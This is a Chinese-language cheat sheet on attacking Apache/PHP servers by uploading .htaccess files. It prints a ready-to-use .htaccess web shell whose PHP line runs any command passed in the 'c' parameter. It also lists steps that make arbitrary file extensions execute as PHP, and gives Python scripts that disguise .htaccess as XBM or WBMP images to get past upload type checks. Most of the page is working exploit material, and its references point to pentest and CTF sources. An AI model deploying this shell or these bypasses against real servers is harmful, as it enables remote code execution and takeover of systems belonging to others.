# .htaccess 文件上传

上传.htaccess文件以覆盖apache原先的配置文件并执行PHP。攻击者还可以利用.htaccess文件上传使任意文件的后缀名称都可执行PHP代码。举个简单的例子，在我们认知中一些特定的文件名称后缀作为静态文件，不具备PHP脚本执行功能，如JPG、PNG、CSS等。但通过上传.htaccess文件，可以将原先的静态文件变成可执行的PHP动态脚本。

自包含式 .htaccess web shell

```python
# 自包含式 .htaccess web shell - htShell 项目的一部分
# 作者 Wireghoul - http://www.justanotherhacker.com

# 覆盖默认拒绝规则使 .htaccess 文件可通过Web访问
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

# 将.htaccess文件解释为php文件。
# Apache从.htaccess文件定向
AddType application/x-httpd-php .htaccess
```

```php
###### SHELL ######
<?php echo "\n";passthru($_GET['c']." 2>&1"); ?>
```

# 修改.htaccess使任意扩展名变成php

1.编辑.htaccess文件内容为: `AddType application/x-httpd-php .rce`   
2.上传.htaccess文件
3.上传扩展名为`.rce`的文件，文件内容包含PHP代码，访问`xx.rce`文件即可当做PHP文件执行。
4.更多细节可参考 [.htaccess文件解析漏洞](https://blog.csdn.net/weixin_44032232/article/details/108998564)

# .htaccess 图片上传

如果在服务器端使用`exif_Imagetype`函数来确定上传的图片类型，则创建一个`htaccess/image(png/jpg/gif)`

[支持的图像类型](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants)包括[X BitMap (XBM)](https://en.wikipedia.org/wiki/X_BitMap)和[WBMP](https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format)。在忽略以`\x00`和`#`开头的行的`.htaccess`中，可以使用以下脚本生成有效的.`htaccess/image(png/jpg/gif)`

```python
# create valid .htaccess/xbm image

width = 50
height = 50
payload = '# .htaccess file'

with open('.htaccess', 'w') as htaccess:
    htaccess.write('#define test_width %d\n' % (width, ))
    htaccess.write('#define test_height %d\n' % (height, ))
    htaccess.write(payload)
```
或
```python
# create valid .htaccess/wbmp image

type_header = b'\x00'
fixed_header = b'\x00'
width = b'50'
height = b'50'
payload = b'# .htaccess file'

with open('.htaccess', 'wb') as htaccess:
    htaccess.write(type_header + fixed_header + width + height)
    htaccess.write(b'\n')
    htaccess.write(payload)
```

## 致谢&参考

* [ATTACKING WEBSERVERS VIA .HTACCESS - By Eldar Marcussen](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
* [Protection from Unrestricted File Upload Vulnerability](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
* [Writeup to l33t-hoster task, Insomnihack Teaser 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
* [.htaccess文件解析漏洞](https://blog.csdn.net/weixin_44032232/article/details/108998564)